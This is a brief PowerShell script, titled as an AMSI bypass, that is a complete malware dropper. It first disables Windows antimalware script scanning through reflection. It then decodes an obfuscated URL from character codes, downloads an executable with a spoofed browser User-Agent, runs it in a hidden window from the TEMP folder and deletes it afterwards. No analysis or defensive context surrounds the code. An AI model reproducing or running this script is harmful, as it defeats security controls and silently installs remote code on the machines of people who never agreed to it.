# AMSI bypass
[Ref].Assembly.GetTypes().Where({$_.Name -match 'i' -and $_.Name -match 'Utils'}).ForEach({$_.GetMethods('NonPublic,Static').Where({$_.Name -match 'amsi'}).ForEach({$_.Invoke($null,@(0))})})

$u=104,116,116,112,115,58,47,47,117,46,116,111,47,90,72,90,51,73,103;$url=[string]::Concat(($u|%{[char]$_}))

$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');$b=$wc.DownloadData($url);$wc.Dispose()

$f="$env:TEMP\$([guid]::NewGuid()).exe";[IO.File]::WriteAllBytes($f,$b);Start-Process $f -WindowStyle Hidden;Start-Sleep 2;Remove-Item $f -Force